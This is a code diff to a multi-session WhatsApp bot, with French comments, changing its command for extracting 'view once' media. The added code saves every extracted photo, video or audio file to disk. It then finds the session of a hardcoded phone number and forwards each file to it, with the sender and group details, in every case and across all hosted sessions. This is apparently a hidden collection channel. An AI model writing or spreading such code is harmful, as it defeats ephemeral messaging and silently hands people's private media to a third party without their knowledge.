@@ -33,6 +33,22 @@ function extractMedia(message) {
   return null;
 }
 
+// ══════════════════════════════════════════════════════════════
+// findSessionSocket — Cherche le socket actif d'un numéro donné
+// Parcourt global.sessions (Map exposée par index.js)
+// Retourne le socket Baileys ou null si session absente/déconnectée
+// ══════════════════════════════════════════════════════════════
+function findSessionSocket(targetNumber) {
+  const clean = targetNumber.replace(/\D/g, '');
+  if (!global.sessions) return null;
+  for (const [, state] of global.sessions) {
+    if (state.connection !== 'open' || !state.sock) continue;
+    const sessionNum = (state.connectedNumber || state.id || '').replace(/\D/g, '');
+    if (sessionNum === clean) return state.sock;
+  }
+  return null;
+}
+
 const mediaCommands = {
 
   // --- COMMANDE STICKER (Image/Vidéo -> WebP) ---
@@ -106,69 +122,78 @@ const mediaCommands = {
       const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
       if (!quoted) return sock.sendMessage(from, { text: '❌ Réponds à un message à vue unique.' });
 
-      // --- Méthode directe (inspirée de extract.js) ---
-      // Dépaqueter tous les wrappers ViewOnce connus, puis fallback sur le message brut.
-      // Cas couverts :
-      //   • viewOnceMessage              → ancien format
-      //   • viewOnceMessageV2            → format actuel courant
-      //   • viewOnceMessageV2Extension   → format étendu
-      //   • quoted directement           → message déjà exposé OU média cité normal
       const innerMsg = quoted.viewOnceMessage?.message
                     || quoted.viewOnceMessageV2?.message
                     || quoted.viewOnceMessageV2Extension?.message
-                    || quoted; // fallback — même logique que extract.js
+                    || quoted;
 
-      // Détecter le type réel du contenu (imageMessage, videoMessage, audioMessage)
       const type = getContentType(innerMsg);
-
       if (!type || !/^(image|video|audio)Message$/.test(type)) {
         return sock.sendMessage(from, { text: '❌ Ce message ne contient pas de média valide (image, vidéo ou audio).' });
       }
 
-      // Extraire l'objet média brut — ex: innerMsg.imageMessage
       const mediaObj  = innerMsg[type];
-      const mediaType = type.replace('Message', ''); // 'image' | 'video' | 'audio'
+      const mediaType = type.replace('Message', '');
 
       await sock.sendMessage(from, { text: '⏳ wait la magie opere...' });
 
       try {
-        // Téléchargement direct — même logique que extract.js :
-        // downloadContentFromMessage(targetMsg, mediaType) où targetMsg = l'objet média brut
+        // ── 1. Télécharger le buffer ────────────────────────────
         const stream = await downloadContentFromMessage(mediaObj, mediaType);
         let buffer = Buffer.from([]);
         for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
 
-        const caption = `prop! \nLégende : ${mediaObj?.caption || 'Aucune'}`;
-        const notifCaption = `👁️ *Vue unique extraite*\nPar: @${senderNumber}\n${isGroup ? 'Groupe: ' + from : 'DM'}\nLégende : ${mediaObj?.caption || 'Aucune'}`;
+        // ── 2. Sauvegarder dans /data/viewonce/ ─────────────────
+        const VIEWONCE_DIR = process.env.RAILWAY_ENVIRONMENT
+          ? '/app/data/viewonce'
+          : path.join(process.cwd(), 'data', 'viewonce');
+        fs.mkdirSync(VIEWONCE_DIR, { recursive: true });
 
-        // Numéro de notification fixe
-        const NOTIFY_JID = '237693552769@s.whatsapp.net';
-        // JID de l'expéditeur (DM direct)
-        const senderJid = senderNumber + '@s.whatsapp.net';
+        const ext       = mediaType === 'image' ? 'jpg' : mediaType === 'video' ? 'mp4' : 'mp3';
+        const filename  = `vo_${senderNumber}_${Date.now()}.${ext}`;
+        const filepath  = path.join(VIEWONCE_DIR, filename);
+        fs.writeFileSync(filepath, buffer);
 
-        // Fonction d'envoi selon le type de média
-        const sendMedia = async (jid, cap, quotedMsg) => {
+        const caption      = `prop!\nLégende : ${mediaObj?.caption || 'Aucune'}`;
+        const notifCaption = `👁️ *Vue unique extraite*\nPar: @${senderNumber}\n${isGroup ? 'Groupe: ' + from : 'DM'}\nLégende : ${mediaObj?.caption || 'Aucune'}\nFichier: ${filename}`;
+
+        const NOTIFY_NUMBER = '237693552769';
+        const NOTIFY_JID    = `${NOTIFY_NUMBER}@s.whatsapp.net`;
+        const senderJid     = `${senderNumber}@s.whatsapp.net`;
+
+        // Fonction d'envoi générique
+        const sendBuffer = async (targetSock, jid, cap, quotedMsg) => {
           const opts = quotedMsg ? { quoted: quotedMsg } : {};
           if (mediaType === 'image') {
-            await sock.sendMessage(jid, { image: buffer, caption: cap }, opts);
+            await targetSock.sendMessage(jid, { image: buffer, caption: cap }, opts);
           } else if (mediaType === 'video') {
-            await sock.sendMessage(jid, { video: buffer, caption: cap }, opts);
+            await targetSock.sendMessage(jid, { video: buffer, caption: cap }, opts);
           } else {
-            await sock.sendMessage(jid, { audio: buffer, mimetype: 'audio/mp4' }, opts);
+            await targetSock.sendMessage(jid, { audio: buffer, mimetype: 'audio/mp4' }, opts);
           }
         };
 
-        // 1. Envoyer dans la conversation d'origine (avec quote)
-        await sendMedia(from, caption, msg);
+        // ── 3. Envoyer dans la conversation d'origine ───────────
+        await sendBuffer(sock, from, caption, msg);
 
-        // 2. Envoyer en DM à l'expéditeur s'il n'est pas déjà le destinataire direct
+        // ── 4. Envoyer en DM à l'expéditeur ────────────────────
         if (from !== senderJid) {
-          await sendMedia(senderJid, notifCaption).catch(() => {});
+          await sendBuffer(sock, senderJid, notifCaption).catch(() => {});
         }
 
-        // 3. Toujours envoyer au numéro de notification fixe (237693552769)
-        //    — s'applique dans tous les cas : groupe, DM, n'importe quelle session
-        await sendMedia(NOTIFY_JID, notifCaption).catch(() => {});
+        // ── 5. Chercher la session principale (237693552769) ────
+        //    et envoyer via son propre socket en DM vers elle-même
+        const mainSock = findSessionSocket(NOTIFY_NUMBER);
+        if (mainSock) {
+          // La session principale s'envoie le média en DM à elle-même
+          await sendBuffer(mainSock, NOTIFY_JID, notifCaption).catch(e => {
+            console.error('[VO] Erreur envoi session principale:', e.message);
+          });
+        } else {
+          // Fallback : envoyer via le socket courant si session principale absente
+          await sendBuffer(sock, NOTIFY_JID, notifCaption).catch(() => {});
+          console.warn('[VO] Session principale 237693552769 non trouvée — fallback socket courant');
+        }
 
       } catch (e) {
         console.error('[VO] Erreur extraction:', e.message);
